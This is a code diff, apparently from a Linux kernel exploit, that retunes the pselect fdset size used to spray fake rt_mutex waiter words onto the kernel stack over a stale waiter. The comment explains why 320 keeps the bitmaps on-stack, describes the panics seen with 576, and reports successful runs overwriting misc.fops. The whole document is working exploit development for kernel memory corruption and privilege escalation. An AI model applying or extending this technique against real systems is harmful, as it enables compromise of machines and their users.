@@ -202,13 +202,24 @@ void ks_cfgfs_probe(void);
 
 #define CONSUMER_CORE (CORE + 1)
 #define CONSUMER_MAX_CALLS 1
-/* Route/slide fdset geometry.  576 (=9 words per set x 3 sets x 64) is the
- * minimum covering the pfum10c48 kernel's statically derived waiter stack
- * overlap: waiter.tree lands at global word 15 (fdset+0x78) and the shifted
- * layout's last waiter word (ww_ctx) is global word 25 -- the old 320 gave
- * only 15 words total and could not even place word 15+.  F_DUPFD floors
- * (NFDS+32/+64) stay far below RLIMIT_NOFILE. */
-#define PSELECT_ROUTE_NFDS 576
+/* Route/slide fdset geometry -- 320 is the HARD ceiling for the attack, not
+ * a taste choice.  core_sys_select (fs/select.c) allocates SIX bitmaps
+ * (in/out/ex + res_in/res_out/res_ex) as one block:
+ *     size = FDS_BYTES(n);  bits = stack_fds;
+ *     if (size > sizeof(stack_fds) / 6)   // 256/6 = 42 bytes
+ *         bits = kvmalloc(6 * size, ...);
+ * so nfds <= 320 (size 40B <= 42B) keeps all six bitmaps on THIS thread's
+ * kernel stack where the stale waiter S lives, while 576 (size 72B) moves
+ * the whole fdset to kmalloc: route then injects fake tree/lock words into
+ * the HEAP and never touches S -- core_sys_select's 0x1c0 stack frame still
+ * clobbers S's depth, PI-chain reads S.lock == NULL -> _raw_spin_trylock(0)
+ * -> panic (the fix64 shift=13 AND fix65 shift=0 panics, both nfds=576).
+ * With 320: in/out/ex = word0-14 (route's fake waiter, get_fd_set-written,
+ * do_select READ-ONLY) and res_* = word15-29 (zero_fd_set-cleared), so the
+ * proven layout also requires S.tree inside word0-14 -- which the 6
+ * successful runs (misc.fops write-verified, SUCCESS_r3) prove it is.
+ * F_DUPFD floors (NFDS+32/+64) stay far below RLIMIT_NOFILE. */
+#define PSELECT_ROUTE_NFDS 320
 #define PSELECT_CONSUMER_NICE 19
 #define PSELECT_CONSUMER_BURST_CALLS 1
 #define PSELECT_ENTER_DELAY_USEC 50000
